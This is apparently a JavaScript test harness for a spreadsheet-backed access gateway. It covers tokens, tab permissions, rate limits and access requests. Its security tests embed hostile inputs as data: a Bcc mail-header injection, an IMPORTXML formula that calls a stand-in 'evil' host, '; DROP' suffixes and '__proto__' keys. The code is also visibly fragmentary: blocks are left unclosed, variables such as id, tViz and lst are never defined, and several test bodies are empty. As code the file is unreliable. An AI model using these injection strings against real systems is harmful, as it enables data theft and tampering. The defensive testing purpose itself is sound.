function makeDeps(state) {
  const cacheStore = {};
  return {
    config: GATEWAY_CONFIG,
    verifyToken: (t) => { if (!TOKENS[t]) throw new GatewayError_(401, "bad token"); return TOKENS[t]; },
    cache: { get: (k) => cacheStore[k] || null, put: (k, v) => { cacheStore[k] = v; }, remove: (k) => { delete cacheStore[k]; } },
    lock: (fn) => fn(),
    requests: {
      list: () => state.__requests.map((r) => Object.assign({}, r)),
      add: (r) => { state.__requests.push({ linha: state.__requests.length + 2, data: "2026-09-19", email: r.email, nome: r.nome, empresa: r.empresa, tipo: r.tipo, mensagem: r.mensagem, status: "Pendente", nota: "" }); },
      setStatus: (linha, status, nota) => { const r = state.__requests.filter((x) => x.linha === linha)[0]; if (r) { r.status = status; r.nota = nota; } },
    },
    mail: { send: (m) => { if (state.__mailFail) throw new Error("mail down"); state.__mail.push(m); } },
    registry: { list: () => state.__registry.slice(), add: (e) => { state.__registry.push({ spreadsheetId: e.spreadsheetId, empresa: e.empresa, sheetName: "Lançamento", segmento: e.segmento }); } },
    sheets: {
      getTitles: (id) => Object.keys(state[id]),
      getValues: (id, range) => { const tab = range.split("!")[0].replace(/^'|'$/g, ""); if (!state[id] || !state[id][tab]) throw new Error("Unable to parse range: " + range); return state[id][tab].slice(1); },
      updateValues: (id, range, values) => {
        state[id].__log = (state[id].__log || []).concat([[range, values]]);
        const mc = /^Configuração!A(\d+):[BC]\d+$/.exec(range);
        if (mc) { state[id]["Configuração"] = state[id]["Configuração"] || [["Papel", "Aba"]]; state[id]["Configuração"][Number(mc[1]) - 1] = values[0]; }
        const m = /^Usuários!A(\d+):C\d+$/.exec(range);
        if (m) { state[id]["Usuários"] = state[id]["Usuários"] || [["Email", "Nome", "Perfil"]]; state[id]["Usuários"][Number(m[1]) - 1] = values[0]; }
      },
      createCompanySpreadsheet: (title, nome, segmento) => {
        const id = "NEW" + (++state.__created);
        state[id] = {};
        state.__titles = (state.__titles || {}); state.__titles[id] = title;
        companyTemplate_(segmento).forEach((t) => { state[id][t.name] = [t.headers].concat(t.seeds(nome)); });
        return id;
      },
      addTab: (id, title) => { state[id][title] = [["Email","Nome","Perfil"]]; },
    },
  };
}

function run(name, who, body, expect) {
  const state = freshState();
  return runOn(name, who, body, expect, state);
}
function runOn(name, who, body, expect, state) {
  const deps = makeDeps(state);
  let outcome;
  try { const data = handleRequest(Object.assign({ token: who }, body), deps); outcome = "ok"; var payload = data; }
  catch (e) { outcome = e instanceof GatewayError_ ? String(e.status) : "CRASH:" + e.message; }
  const pass = String(expect) === outcome;
  results.push((pass ? "PASS " : "FAIL ") + name + "  (expected " + expect + ", got " + outcome + ")");

}

// --- security: object-prototype keys, odd types, tab-name disclosure
(function () {
  const state = freshState();

    ["getValues", "updateValues", "getTitles", "addTab"].forEach((action) => {
      const r = step("admin", { action: action, spreadsheetId: id, range: "Usuários!A2:C", values: [["a@b.c", "A", "Master"]], title: "Usuários" });
      T(!r.ok && r.status === 403, "spreadsheetId '" + id + "' is refused for " + action + " (even for the system admin)");
    });

  [null, 5, {}, [], true, ["a"]].forEach((id) => {
    const r = step("mas", { action: "getValues", spreadsheetId: id, range: "Estoque!A1:B2" });

  });
  T(!step("mas", { action: undefined, spreadsheetId: IPA }).ok && !step("mas", { action: {}, spreadsheetId: IPA }).ok && !step("mas", { action: "__proto__", spreadsheetId: IPA }).ok, "unknown or odd actions are refused");
  T(!step("mas", { action: "getValues", spreadsheetId: IPA, range: { a: 1 } }).ok && !step("mas", { action: "getValues", spreadsheetId: IPA, range: "Estoque!A1:B2'; DROP" }).ok && !step("mas", { action: "getValues", spreadsheetId: IPA, range: "Estoque!A1:B2\n" }).ok, "malformed ranges are refused");
  T(!step("mas", { action: "getValues", spreadsheetId: IPA, range: "'Estoque'!A1:B2!C3" }).ok && !step("mas", { action: "getValues", spreadsheetId: IPA, range: "Estoque!A1:ZZZZ99999999" }).ok, "chained or absurd ranges are refused");
  const g = (o) => step("mas", { action: "getValues", spreadsheetId: IPA, range: "Estoque!A1:B2", valueRenderOption: o });

  T(tViz.ok && tViz.data.titles.indexOf("Segredos") === -1 && tViz.data.titles.indexOf("Estoque") !== -1 && tViz.data.titles.indexOf("Usuários") === -1, "a Viewer only sees the names of tabs the app may use (not 'Segredos', not 'Usuários')");

  T(!step("", { action: "me" }).ok && !step(undefined, { action: "me" }).ok && !step("x".repeat(5000), { action: "me" }).ok, "empty, missing and oversized tokens are refused");

// --- access requests (anyone signed in with Google may ask; only the admin sees/answers)
(function () {
  const state = freshState();

  const call = (who, body) => { try { return { ok: true, data: handleRequest(Object.assign({ token: who }, body), deps) }; } catch (e) { return { ok: false, status: e.status, msg: e.message }; } };
  const good = { action: "requestAccess", nome: "Ana Souza", empresa: "Padaria Ana", tipo: "nova", mensagem: "Quero usar." };

  results.push((!call("zzz", good).ok && call("zzz", good).status === 401 ? "PASS" : "FAIL") + " a request needs a valid Google token");
  const r1 = call("stranger", good);
  results.push((r1.ok && r1.data.duplicate === false && state.__requests.length === 1 ? "PASS" : "FAIL") + " a stranger can ask for access");
  results.push((state.__requests[0].status === "Pendente" && state.__requests[0].email === "novato@gmail.com" ? "PASS" : "FAIL") + " the request is stored as Pendente with the verified e-mail (not one typed by the user)");
  const mail = state.__mail[0];
  results.push((mail && mail.to.toLowerCase().split(",").indexOf(ADMIN_EMAIL) !== -1 && /Ana Souza/.test(mail.subject) && /Padaria Ana/.test(mail.body) ? "PASS" : "FAIL") + " the administrator is e-mailed with the details");
  const r2 = call("stranger", good);
  results.push((!r2.ok && r2.status === 429 ? "PASS" : "FAIL") + " sending again right away is rate-limited");
  deps.cache.remove("reqcool_novato@gmail.com");
  const r3 = call("stranger", good);
  results.push((r3.ok && r3.data.duplicate === true && state.__requests.length === 1 ? "PASS" : "FAIL") + " a second request while one is pending is not stored again");

  // validation
  const bad = (patch) => { deps.cache.remove("reqcool_outro@gmail.com"); const r = call("stranger2", Object.assign({}, good, patch)); return !r.ok && r.status === 400; };
  results.push((bad({ nome: "  " }) && bad({ empresa: "" }) && bad({ tipo: "hacker" }) && bad({ nome: { a: 1 } }) ? "PASS" : "FAIL") + " missing/invalid fields are refused (name, company, type, non-strings)");
  deps.cache.remove("reqcool_outro@gmail.com");
  const long = call("stranger2", Object.assign({}, good, { nome: "N".repeat(500), mensagem: "M".repeat(5000) }));
  const stored = state.__requests[state.__requests.length - 1];
  results.push((long.ok && stored.nome.length === 80 && stored.mensagem.length === 500 ? "PASS" : "FAIL") + " over-long text is cut to the limits");

  // injection: control characters / header injection / formulas
  const state2 = freshState(); const deps2 = makeDeps(state2);
  const inj = (() => { try { return handleRequest({ token: "stranger", action: "requestAccess", nome: "Eve\r\nBcc: evil@x.com", empresa: "=IMPORTXML(\"http://evil\")", tipo: "nova", mensagem: "linha1\nlinha2\u0000" }, deps2); } catch (e) { return { err: e.message }; } })();
  const m2 = state2.__mail[0];
  results.push((inj.duplicate === false && !/[\r\n]/.test(m2.subject) && state2.__requests[0].nome.indexOf("\n") === -1 && state2.__requests[0].mensagem.indexOf("\u0000") === -1 && state2.__requests[0].mensagem.indexOf("\n") !== -1 ? "PASS" : "FAIL") + " line breaks are removed from short fields and the mail subject; control characters are stripped");
  results.push((state2.__requests[0].empresa.charAt(0) === "=" ? "PASS" : "FAIL") + " a formula-looking company name is stored as plain text (sheet writes are RAW)");

  // a mail failure must not lose the request
  const state3 = freshState(); state3.__mailFail = true; const deps3 = makeDeps(state3);

  results.push((!lst("mas").ok && lst("mas").status === 403 && !lst("edi").ok && !lst("viz").ok && !lst("stranger").ok ? "PASS" : "FAIL") + " nobody else can list requests (not even a company Master)");
  const res = (who, b) => call(who, Object.assign({ action: "resolveRequest" }, b));

  results.push((res("admin", { linha: 1, status: "Atendida" }).status === 400 && res("admin", { linha: 2, status: "Aprovada" }).status === 400 && res("admin", { linha: "2; DROP", status: "Atendida" }).status === 400 && res("admin", { linha: 999, status: "Atendida" }).status === 400 ? "PASS" : "FAIL") + " bad row / status / unknown request are refused");

  const toMasters = state.__mail[mailsBefore];

const failed = results.filter((r) => r.indexOf("FAIL") === 0);
document.getElementById("out").textContent = results.join("\n") + "\n\nTOTAL " + results.length + "  FAILED " + failed.length;
